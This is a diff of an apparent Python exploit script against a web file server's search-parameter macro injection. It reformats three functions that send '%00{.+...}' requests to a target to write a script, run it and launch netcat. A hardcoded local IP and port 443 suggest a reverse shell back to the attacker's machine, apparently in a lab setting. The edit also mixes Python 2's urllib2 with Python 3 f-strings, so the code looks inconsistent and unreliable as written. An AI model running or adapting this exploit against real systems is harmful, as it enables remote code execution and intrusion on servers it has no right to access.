@@ -24,16 +24,37 @@ import sys
 
 try:
 	def script_create():
-		print("script_create: http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")
-		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+save+".}")
+		print(
+			f"script_create: http://{sys.argv[1]}:{sys.argv[2]}"
+			+ "/?search=%00{.+"
+			+ save
+			+ ".}"
+		)
+		urllib2.urlopen(
+			f"http://{sys.argv[1]}:{sys.argv[2]}" + "/?search=%00{.+" + save + ".}"
+		)
 
 	def execute_script():
-		print("execute_script: http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")
-		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe+".}")
+		print(
+			f"execute_script: http://{sys.argv[1]}:{sys.argv[2]}"
+			+ "/?search=%00{.+"
+			+ exe
+			+ ".}"
+		)
+		urllib2.urlopen(
+			f"http://{sys.argv[1]}:{sys.argv[2]}" + "/?search=%00{.+" + exe + ".}"
+		)
 
 	def nc_run():
-		print("nc_run: http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")
-		urllib2.urlopen("http://"+sys.argv[1]+":"+sys.argv[2]+"/?search=%00{.+"+exe1+".}")
+		print(
+			f"nc_run: http://{sys.argv[1]}:{sys.argv[2]}"
+			+ "/?search=%00{.+"
+			+ exe1
+			+ ".}"
+		)
+		urllib2.urlopen(
+			f"http://{sys.argv[1]}:{sys.argv[2]}" + "/?search=%00{.+" + exe1 + ".}"
+		)
 
 	ip_addr = "10.10.14.26" #local IP address
 	local_port = "443" # Local Port number
